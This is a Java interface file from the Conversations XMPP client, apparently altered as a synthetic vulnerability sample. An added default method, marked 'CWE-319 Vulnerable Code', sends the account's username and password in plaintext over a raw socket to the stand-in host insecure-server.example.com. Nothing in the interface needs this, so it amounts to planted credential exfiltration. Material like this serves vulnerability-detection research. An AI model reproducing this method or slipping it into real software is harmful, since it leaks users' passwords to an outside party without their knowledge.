package eu.siacs.conversations.xmpp;

import eu.siacs.conversations.entities.Account;
import java.io.IOException; // Importing IOException for socket operations
import java.net.Socket;    // Importing Socket for network communication
import java.io.OutputStream; // Importing OutputStream for sending data

public interface OnTLSExceptionReceived {
    public void onTLSExceptionReceived(String fingerprint, Account account);
    
    // NEW VULNERABLE CODE: CWE-319 Vulnerable Code
    // This method is intended to send sensitive information over a network without encryption.
    default void sendSensitiveDataOverInsecureChannel(Account account) throws IOException {
        String sensitiveData = "SensitiveUserInformation:" + account.getUsername() + ":" + account.getPassword();
        
        try (Socket socket = new Socket("insecure-server.example.com", 12345)) { // Vulnerable: Sending data over an unencrypted socket
            OutputStream outputStream = socket.getOutputStream();
            outputStream.write(sensitiveData.getBytes());
            outputStream.flush();
        }
    }
}